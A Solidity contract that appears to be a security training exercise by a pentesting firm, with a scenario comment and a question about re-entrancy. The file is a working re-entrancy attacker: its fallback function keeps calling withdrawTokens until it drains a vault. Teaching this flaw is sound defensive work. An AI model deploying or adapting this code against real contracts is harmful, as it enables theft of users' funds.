// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IQuantumVault {
    function depositTokens() external payable;
    function withdrawTokens() external;
}

/**
 * @title QuantumHacker
 * @author Lucas Martin Calderon, Pentestify LTD
 * Scenario: As a cunning hacker in the quantum era, you've spotted a flaw in the QuantumVault.
 * Your goal is to exploit this flaw to empty the vault.
 * Question: Reflect on how re-entrancy might be a threat to contracts. How does it work?
 */

contract QuantumHacker {
    IQuantumVault public quantumVault;
    uint256 constant public HACK_AMOUNT = 1 ether;

    event QuantumRaid(uint amount);

    constructor(address _quantumVaultAddress) {
        quantumVault = IQuantumVault(_quantumVaultAddress);
    }

    // Fallback function to receive tokens and re-initiate withdrawal
    receive() external payable {
        if (address(quantumVault).balance >= HACK_AMOUNT) {
            quantumVault.withdrawTokens();
        }
    }

    // Initiate the hack
    function initiateHack() external payable {
        require(msg.value >= HACK_AMOUNT, "Insufficient funds to hack");
        quantumVault.depositTokens{value: HACK_AMOUNT}();
        quantumVault.withdrawTokens();
        emit QuantumRaid(address(this).balance);
    }

    // Check the hacker's balance
    function getHackerBalance() public view returns (uint) {
        return address(this).balance;
    }
}
